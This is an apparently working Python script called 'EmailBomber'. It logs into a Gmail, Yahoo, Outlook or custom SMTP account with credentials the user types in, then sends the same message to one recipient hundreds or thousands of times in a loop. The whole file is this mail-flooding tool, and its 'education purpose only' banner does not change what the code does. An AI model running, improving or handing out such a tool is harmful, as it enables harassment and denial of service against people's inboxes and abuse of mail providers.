import smtplib
import termcolor
import sys, time, requests, pyfiglet, random

# print(termcolor.colored("hey", "red", "on_white"))

class EmailBomber:
    def __init__(self):
        print(termcolor.colored("Used for education purpose Only! \n", "red", "on_yellow"))
        print(termcolor.colored("Email Bomber Initializing... \n", "yellow", "on_green"))
        text = [".ECHO", ".ECHO CIPHER", ".Echo Cipher"]
        text = random.choice(text)
        ascii_art = pyfiglet.figlet_format(text)
        color = ["green", "yellow", "white", "cyan", "blue"]
        print(termcolor.colored(ascii_art, random.choice(color)))

        self.email = input("Enter your email here: ")
        self.recemail = input("Enter receiver email here: ")
        self.password = input("Enter your password here: ")
        self.message = input("Enter your message here: ")

    def is_internet_on(self):
        try:
            response = requests.head("http://www.google.com", timeout=5)
            print(termcolor.colored("\nNetwork is working... Done!", "green"))
        except requests.ConnectionError:
            print(termcolor.colored("\nNetwork is not working... Error!", "red"))
            sys.exit(1)

    def send_email(self):
        headers = f"From: {self.email}\nTo: {self.recemail}\n\n"
        
        # Combine headers and the message content
        message = headers + self.message

        server = smtplib.SMTP(self.server, self.port)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.recemail, message)
        server.quit()

    def service(self):
        self.service = int(input(termcolor.colored("Enter service 1 for google, 2 for yahoo, 3 for outlook, 4 for custom: ", "green")))

        if self.service < 1 or self.service > 4:
            print(termcolor.colored("Error", "red"))
            sys.exit(1)

        elif self.service == 1:
            self.server = "smtp.gmail.com"
            self.port = 587

        elif self.service == 2:
            self.server = "smtp.mail.yahoo.com"
            self.port = 587

        elif self.service == 3:
            self.server = "smtp.office365.com"
            self.port = 587
            
        elif self.service == 4:
            self.server = input(termcolor.colored("Enter smtp server here: ", "yellow"))
            self.port = int(input(termcolor.colored("Enter port here: ", "yellow")))

        else:
            print(termcolor.colored("Something went wrong", "red"))
            sys.exit(1)

    def startbombing(self, bomb):
        print(termcolor.colored("\nStarting...\n", "blue"))
        for i in range(1, bomb+1):
            self.send_email()
            print(termcolor.colored(f"Bombing count: {i}", "light_red"))
            time.sleep(1)
        
        print(termcolor.colored("\nThanks for using EBomber by .ECHO Cipher.", "green"))
    
    def run(self):
        no_of_bombing = int(input(termcolor.colored("\nEnter number of messages sending 1 for 1000, 2 for 500, 3 for 100 and 4 for custom: ", "yellow")))

        if no_of_bombing < 1 or no_of_bombing > 4:
            print(termcolor.colored("Invalid input!", "red"))

        if no_of_bombing == 1:
            bombs = 1000

        if no_of_bombing == 2:
            bombs = 500

        if no_of_bombing == 3:
            bombs = 100

        if no_of_bombing == 4:
            bombs = int(input(termcolor.colored("Enter number of bombing: ", "yellow")))

        self.startbombing(bombs)


if __name__ == "__main__":
    try:
        ebombing = EmailBomber()
        ebombing.is_internet_on()
        ebombing.service()
        ebombing.run()

    except KeyboardInterrupt:
        print(termcolor.colored("KeyboredInterepted Stopping...", "light_red"))

    except Exception as e:
        print(termcolor.colored(f"Error Occured! - {e}", "red"))